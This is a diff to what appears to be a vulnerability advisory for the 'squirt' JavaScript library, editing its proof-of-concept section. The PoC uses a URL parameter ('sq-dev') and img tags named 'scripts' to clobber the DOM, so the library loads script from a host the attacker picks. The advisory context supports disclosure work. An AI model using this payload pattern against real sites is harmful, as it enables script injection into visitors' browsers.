@@ -30,14 +30,16 @@ sq.host =  window.location.search.match('sq-dev') ?
 
 ## PoC
 
-Visit the page: `http://10.161.159.131:8080/squirt/poc.html?sq-dev=xxx.xxx.xxx`
+Visit the page: `http://10.161.159.131:8080/squirt/poc.html?sq-dev=localhost:9999`
 
+```html
+<!--Library-->
+<script src="./squirt.js"></script>
+<!--Library-->
+
+<!--Payload-->
+<img name="scripts" src="http://localhost:9999">
+<img name="scripts" src="http://localhost:9999">
+<!--Payload-->
 ```
-<html>
-<body>
-  <img name="scripts" src="http://xxx.xxx.xxx">
-  <img name="scripts" src="http://xxx.xxx.xxx">
-  <script src="./squirt.js"></script>
-</body>
-</html>
-```
+
